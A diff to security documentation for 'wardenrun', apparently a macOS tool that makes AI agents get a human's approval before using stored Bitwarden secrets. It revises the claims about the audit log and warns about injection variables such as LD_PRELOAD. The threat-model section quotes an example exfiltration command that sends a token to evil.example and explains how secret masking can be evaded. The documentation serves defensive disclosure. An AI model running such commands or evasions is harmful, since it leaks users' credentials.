@@ -153,7 +153,8 @@ and 5 above apply to it as well.
 - **Hardened runtime**: a macOS code-signing mode that blocks the usual ways of injecting code
   into a program.
 - **`0600` / `0700`**: file permissions meaning "readable only by you".
-- **Hash-chained log**: each line carries the hash of the previous line, so edits are detectable.
+- **Hash-chained log**: each line carries the hash of the previous line. That catches accidents
+  and clumsy edits; a process of yours that knows the format can still rewrite or cut the log.
 
 ### One-time setup
 
@@ -200,7 +201,7 @@ dedicated account and the advice below.
 | **One macOS login-keychain item** | The master password of the dedicated account, the server address, the account name, the organization and allowed collection, and the identity of the `bw` program wardenrun trusts. Only programs signed with wardenrun's certificate can read it. | Until you remove it or run `wardenrun setup` again |
 | **`~/.config/wardenrun/bw/`** | wardenrun's *own* `bw` profile: login tokens (**plain text**, mode `0600`; plus the API-key secret if you logged in with one) and, as far as is known, an encrypted copy of the vault and the wrapped vault key. Never your personal `bw` profile. | Until you delete it. An option logs out after every run. |
 | **`~/.config/wardenrun/config.toml`** | Preferences only: approval timeout, the redaction text, the log path. Nothing in it can widen access. | Until you delete it |
-| **`~/Library/Logs/wardenrun/audit.jsonl`** | One line per event: time, event (approved, denied, timeout, error, new, setup), item *name*, command line (any secret masked), program path and hash, working directory, parent processes, protection level, exit status, duration. Lines are hash-chained so edits are detectable. **Never values.** | Until you delete it |
+| **`~/Library/Logs/wardenrun/audit.jsonl`** | One line per event: time, event (approved, denied, timeout, error, new, setup), item *name*, command line (any secret masked), program path and hash, working directory, parent processes, protection level, exit status, duration. Lines are hash-chained, which catches accidents and clumsy edits, not a determined rewrite by a process of yours. **Never values.** | Until you delete it |
 | **A temporary file** | Only with `--file`: a `0600` file in a fresh `0700` directory containing the secret | Removed when the command exits, and on signals |
 | **wardenrun's memory** | The master password and the secret, in locked memory, zeroed after use, with core dumps disabled | Seconds |
 
@@ -233,6 +234,9 @@ What wardenrun does **not** protect you from, in everyday words:
 - **A command you approved.** wardenrun shows you the command; it cannot tell whether it is
   safe. Approve `curl evil.example -d "$TOKEN"` and the secret leaves. Masking catches
   accidents, not intent: a command that writes the secret to a file, or encodes it, gets past it.
+  The sheet shows the command but not the environment the agent set, so wardenrun will tag risky
+  variables (`NODE_OPTIONS`, `BASH_ENV`, `LD_PRELOAD`) and a program file you can edit: such a
+  file can be swapped for another between the final check and the start.
 - **A running command's environment.** With `--env`, another process of yours can read it with
   `ps eww` while the command runs. Prefer `--stdin` when the tool supports it.
 - **`bw`'s own leftovers.** If a fallback path ships (step 4), the session key or the master
